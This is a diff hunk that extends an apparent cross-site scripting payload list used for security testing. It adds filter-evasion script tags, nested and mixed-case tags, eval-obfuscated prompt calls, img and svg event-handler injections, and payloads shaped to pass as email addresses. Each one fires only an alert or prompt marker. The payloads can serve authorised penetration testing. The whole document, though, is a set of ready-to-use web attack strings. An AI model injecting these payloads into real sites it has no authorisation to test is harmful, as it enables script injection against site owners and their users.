@@ -5,6 +5,30 @@
 '-eval("window['pro'%2B'mpt'](xss.n)")-'
 "-eval("window['pro'%2B'mpt'](xss.n)")-"
 <script>alert(xss.n)</script>
+<scr<script>alert(xss.n)</script>
+"<script>alert(xss.n)</script>
+<<script>alert(xss.n)</script>
+<script >alert(xss.n)</script >
+<script>alert('xss.n')</script>
+`<script>alert(xss.n)</script>`
+<sCript>alert(xss.n)</sCript>
+;<script>alert(xss.n)</script>
+";<script>alert(xss.n)</script>
 <scr<script>ipt>alert(xss.n)</scr<script>ipt>
 "><img src=x onerror=alert(xss.n)>
+"/><img src=x onerror=alert(xss.n)>
 %3Cscript%3Ealert%28xss.n%29%3C%2Fscript%3E
+"-prompt(xss.db)-"
+'-prompt(xss.db)-'
+";a=prompt,a(xss.db)//
+';a=prompt,a(xss.db)//
+'-eval("window['pro'%2B'mpt'](xss.db)")-'
+"-eval("window['pro'%2B'mpt'](xss.db)")-"
+"onclick=prompt(xss.db)>"@x.y
+"onclick=prompt(xss.db)><svg/onload=prompt(xss.db)>"@x.y
+<image/src/onerror=prompt(xss.db)>
+<img/src/onerror=prompt(xss.db)>
+<image src/onerror=prompt(xss.db)>
+<img src/onerror=prompt(xss.db)>
+<image src =q onerror=prompt(xss.db)>
+<img src =q onerror=prompt(xss.db)>
